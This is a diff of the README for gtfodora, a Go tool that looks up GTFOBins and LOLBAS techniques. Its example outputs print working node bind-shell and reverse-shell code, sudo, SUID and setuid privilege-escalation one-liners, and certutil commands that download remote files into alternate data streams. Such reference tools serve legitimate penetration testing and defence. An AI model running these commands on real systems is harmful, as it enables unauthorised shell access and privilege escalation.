@@ -14,7 +14,7 @@ I used this project to learn GO, or at least to get started with it. The code is
 ```bash
 Usage of ./gtfodora:
   -clone-path string
-    	The path in which to clone the gtfobin and lolbas repos, defaults to "/tmp" (default ".")
+    	The path in which to clone the gtfobin and lolbas repos, defaults to "/tmp." (default "/tmp")
   -f string
     	Filter the search only for the specified function
   -list-all
@@ -25,8 +25,10 @@ Usage of ./gtfodora:
     	Search for the binary specified and prints its details
   -unix
     	Filter the search among only unix binaries (i.e., gtfobin)
+  -v	Set loglevel to DEBUG
   -win
     	Filter the search among only windows binaries (i.e, lolbas)
+
 ```
 
 The `-clone-path` defaults to `/tmp` and represents the directory in which the repositories will be cloned.
@@ -34,78 +36,50 @@ The `-list-all` and `-list-functions` print, respectively, all the binaries (bot
 The `-unix` and `-win` switches can be used together with all the other commands and will filter the results for GTFObins or LOLbas only, respectively.
 The `-s` and `-f` can be used to search for specific binaries (-s), binaries that allow a certain function (-f) or to get the information on how a function is performed by a specific binary (combined).
 
-At every execution the binary is run will try to clone and pull the repositories, so that the information is up-to-date.
+At every execution the program will try to clone and pull the repositories, so that the information is up-to-date.
 
 ## Examples
 
 List all the functions for GTFObins:
 
 ```bash
-./gtfodora -clone-path . -list-functions -unix
+time ./gtfodora -clone-path . -list-functions -unix
 Functions available:
-	Shell
-	FileUpload
-	FileDownload
-	FileWrite
-	FileRead
-	LibraryLoad
-	Sudo
-	NonInteractiveReverseShell
-	Command
-	BindShell
-	SUID
-	LimitedSUID
-	ReverseShell
-	NonInteractiveBindShell
-	Capabilities
+	shell
+	upload
+	download
+	filewrite
+	fileread
+	libraryload
+	sudo
+	noninteractiverevshell
+	command
+	bindshell
+	suid
+	limitedsuid
+	revshell
+	noninteractivebindshell
+	capabilities
+./gtfodora -clone-path . -list-functions -unix  0,31s user 0,11s system 21% cpu 1,927 total
 ```
 
-Search for all the binaries that can perform the 'BindShell' function:
+Search for all the binaries that can perform the 'bindshell' function:
 
 ```bash
-./gtfodora -f BindShell          
-List of all the binaries with function BindShell:
+time ./gtfodora -f bindshell
+List of all the binaries with function bindshell:
 nc
 node
 socat
+./gtfodora -f bindshell  0,10s user 0,02s system 13% cpu 0,913 total
 ```
 
-Get the details of how a binary can accomplish the BindShell function:
+Get the details of how a binary can accomplish the bindshell function:
 
 ```bash
-./gtfodora -f BindShell -s node
-The binary node allows to perform function BindShell.
-Description:
-
-Run `nc target.com 12345` on the attacker box to connect to the shell.
-Code:
-
-export LPORT=12345
-node -e 'sh = require("child_process").spawn("/bin/sh");
-require("net").createServer(function (client) {
-  client.pipe(sh.stdin);
-  sh.stdout.pipe(client);
-  sh.stderr.pipe(client);
-}).listen(process.env.LPORT);'
-```
-
-Get all the details about a specific binary:
-
-```bash
-./gtfodora -s node             
-Information about: node
---------------------------------
-Shell:
-- Code:
-node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
-
---------------------------------
-Sudo:
-- Code:
-sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
-
---------------------------------
-Bind Shell:
+time ./gtfodora -f bindshell -s node
+[+] bindshell:
+--------------
 - Description:
 Run `nc target.com 12345` on the attacker box to connect to the shell.
 - Code:
@@ -117,13 +91,49 @@ require("net").createServer(function (client) {
   sh.stderr.pipe(client);
 }).listen(process.env.LPORT);'
 
---------------------------------
-SUID:
+
+./gtfodora -f bindshell -s node  0,11s user 0,01s system 13% cpu 0,936 total
+```
+
+Get all the details about a specific binary:
+
+```bash
+time ./gtfodora -s node
+Information about: node
+[+] shell:
+----------
+- Code:
+node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
+
+
+[+] sudo:
+---------
+- Code:
+sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
+
+
+[+] bindshell:
+--------------
+- Description:
+Run `nc target.com 12345` on the attacker box to connect to the shell.
+- Code:
+export LPORT=12345
+node -e 'sh = require("child_process").spawn("/bin/sh");
+require("net").createServer(function (client) {
+  client.pipe(sh.stdin);
+  sh.stdout.pipe(client);
+  sh.stderr.pipe(client);
+}).listen(process.env.LPORT);'
+
+
+[+] suid:
+---------
 - Code:
 ./node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});'
 
---------------------------------
-Reverse Shell:
+
+[+] revshell:
+-------------
 - Description:
 Run `nc -l -p 12345` on the attacker box to receive the shell.
 - Code:
@@ -136,45 +146,55 @@ net.connect(process.env.RPORT, process.env.RHOST, function () {
   sh.stderr.pipe(this);
 });'
 
---------------------------------
-Capabilities:
+
+[+] capabilities:
+-----------------
 - Code:
 ./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
+
+
+./gtfodora -s node  0,12s user 0,04s system 16% cpu 0,904 total
 ```
 
 Do the same, for a Windows binary: 
 
 ```bash
-./gtfodora -s Certutil.exe
+time ./gtfodora -s Certutil.exe
 Information about: Certutil.exe
---------------------------------
-Download:
+[+] download:
+-------------
 - Description:
 Download and save 7zip to disk in the current folder.
 - Code:
 certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
---------------------------------
-Download:
+
+[+] download:
+-------------
 - Description:
 Download and save 7zip to disk in the current folder.
 - Code:
 certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe
---------------------------------
-ADS:
+
+[+] ads:
+--------
 - Description:
 Download and save a PS1 file to an Alternate Data Stream (ADS).
 - Code:
 certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
---------------------------------
-Encode:
+
+[+] encode:
+-----------
 - Description:
 Command to encode a file using Base64
 - Code:
 certutil -encode inputFileName encodedOutputFileName
---------------------------------
-Decode:
+
+[+] decode:
+-----------
 - Description:
 Command to decode a Base64 encoded file.
 - Code:
 certutil -decode encodedInputFileName decodedOutputFileName
+
+./gtfodora -s Certutil.exe  0,10s user 0,03s system 13% cpu 0,975 total
 ```
